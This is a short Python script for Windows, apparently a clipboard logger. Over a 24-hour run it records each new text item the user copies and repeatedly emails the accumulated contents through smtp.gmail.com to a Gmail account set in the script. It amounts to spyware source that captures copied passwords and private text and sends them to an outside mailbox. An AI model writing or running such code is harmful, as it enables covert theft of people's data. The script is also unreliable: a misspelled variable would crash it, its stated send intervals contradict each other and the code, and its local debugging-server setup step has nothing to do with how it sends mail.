# =============================================================================
# This program will listen to the users clipboard and copy the data to a list
# this list is then sent every 10 minutes to a user defined gmail address
# Note you must use a GMAIL address to send from
# You MUST 'enable control to less secure apps' 
# https://support.google.com/a/answer/6260879?hl=en
# Please run the following command in command prompt/anaconda prompt etc 
# Before you run this script:
# python -m smtpd -c DebuggingServer -n localhost:1025
# =============================================================================

import win32clipboard
import smtplib, ssl
import time


#Accound details for user email
email = "YOUR_GMAIL_ADDRESS"
password = "YOUR_GMAIL_PASSWORD"
port = 465

#ttl = time to live, how long the program will run for in seconds(24hrs)
ttl = 86400#time to live, to be changed

#function to send clipboard data to a defined email address via smtp
def sendClipboard(email,password,message,port):
    context = ssl.create_default_context()
    with smtplib.SMTP_SSL("smtp.gmail.com", port, context=context) as server:
        server.login(email, password)
        server.sendmail(email, email, message)

#the clipboard data sent via email must be in ascii, this avoids crashes when 
#the user copies an image, or other non text file
def is_ascii(s):
    return all(ord(c) < 128 for c in s)

#this function copies data from the clipboard to a variable c
def clipboardCopy(c):
    try:
        win32clipboard.OpenClipboard()
        onBoard = win32clipboard.GetClipboardData()
        if c != onBoard and is_ascii(onBoard) == True:
            c = onBoard
            print(c)
        win32clipboard.CloseClipboard()
        time.sleep(1.5)
    except:
        win32clipboard.CloseClipboard()
        time.sleep(1.5)
    return c

#current is the current running string of copied data
#message is the current string of all copied data which will be sent in the email
message = ""
currentData = ""
lastData = ""

#run while current time is less than the ttl
start = time.time()
while time.time() - start < ttl:
    currentData = clipboardCopy(currentData)
    message = message + "\n*****\n" + currentData
    
#if current time is equal to deicced time in seconds send email(5 minutes)
#
    if (round((time.time() - start)) % 3 == 0) and (lastData != currenrtDat): 
        sendClipboard(email,password,message,port)
        lastData = currentData
        message = ""
        
#Send at the very end of life just in case
sendClipboard(email,password,message,port)